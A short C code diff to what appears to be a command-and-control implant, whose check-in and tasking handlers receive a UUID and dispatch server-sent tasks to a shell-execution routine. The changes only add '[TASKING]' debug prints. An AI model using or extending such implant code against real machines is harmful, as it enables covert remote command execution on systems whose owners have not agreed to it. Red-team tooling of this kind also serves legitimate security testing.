@@ -6,7 +6,7 @@ BOOL handleGetTasking(PParser getTasking)
 {
 	UINT32 numTasks = getInt32(getTasking);
 	if (numTasks)
-		printf("Got %d tasks !\n", numTasks);
+		printf("[TASKING] Got %d tasks !\n", numTasks);
 
 	for (UINT32 i = 0; i < numTasks; i++)
 	{
@@ -19,7 +19,6 @@ BOOL handleGetTasking(PParser getTasking)
 		{
 			executeShell(taskParser);
 		}
-
 	}
 
 	return TRUE;
@@ -48,6 +47,8 @@ BOOL parseCheckin(PParser ResponseParser) {
 	SIZE_T sizeUuid = 36;
 	PCHAR newUUID = getString(ResponseParser, &sizeUuid);
 	setUUID(newUUID);
+
+	printf("[TASKING] Got new UUID ! --> %s\n", newUUID);
 
 	freeParser(ResponseParser);
 
